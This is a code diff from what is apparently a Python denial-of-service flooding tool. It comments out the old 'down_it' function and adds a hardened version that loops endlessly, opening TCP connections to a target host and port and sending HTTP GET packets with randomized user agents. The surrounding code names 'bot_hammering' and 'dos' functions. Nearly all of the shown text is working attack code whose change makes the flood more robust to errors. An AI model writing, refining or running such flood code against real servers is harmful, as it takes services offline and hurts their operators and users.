@@ -40,28 +40,55 @@ def bot_hammering(url):
 	except:
 		time.sleep(.1)
 # TCP flood with headers
+# def down_it(item):
+#     try:
+#         while True:
+#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#             sock.settimeout(3)
+#             sock.connect((host, port))
+#             packet = (
+#                 f"GET / HTTP/1.1\r\n"
+#                 f"Host: {host}\r\n"
+#                 f"User-Agent: {random.choice(uagent)}\r\n"
+#                 f"Accept: */*\r\n"
+#                 f"Connection: keep-alive\r\n"
+#                 f"{data}\r\n\r\n"
+#             ).encode('utf-8')
+#             sock.send(packet)
+#             print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
+#             sock.shutdown(socket.SHUT_WR)
+#             sock.close()
+#             time.sleep(0.1)
+#     except socket.error as e:
+#         print(f"\033[91m[Error] Socket: {e}\033[0m")
+#         time.sleep(0.5)
 def down_it(item):
     try:
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(3)
-            sock.connect((host, port))
-            packet = (
-                f"GET / HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"User-Agent: {random.choice(uagent)}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: keep-alive\r\n"
-                f"{data}\r\n\r\n"
-            ).encode('utf-8')
-            sock.send(packet)
-            print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
-            sock.shutdown(socket.SHUT_WR)
-            sock.close()
-            time.sleep(0.1)
-    except socket.error as e:
-        print(f"\033[91m[Error] Socket: {e}\033[0m")
+            try:
+                sock.connect((host, port))
+                packet = (
+                    f"GET / HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"User-Agent: {random.choice(uagent)}\r\n"
+                    f"Accept: */*\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"{data}\r\n\r\n"
+                ).encode('utf-8')
+                sock.send(packet)
+                print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
+                sock.shutdown(socket.SHUT_WR)
+            except socket.error as e:
+                print(f"\033[91m[Error] Socket: {e}\033[0m")
+            finally:
+                sock.close()
+                time.sleep(0.1)
+    except Exception as e:
+        print(f"\033[91m[Unhandled Error] {e}\033[0m")
         time.sleep(0.5)
+
 
 
 def dos():
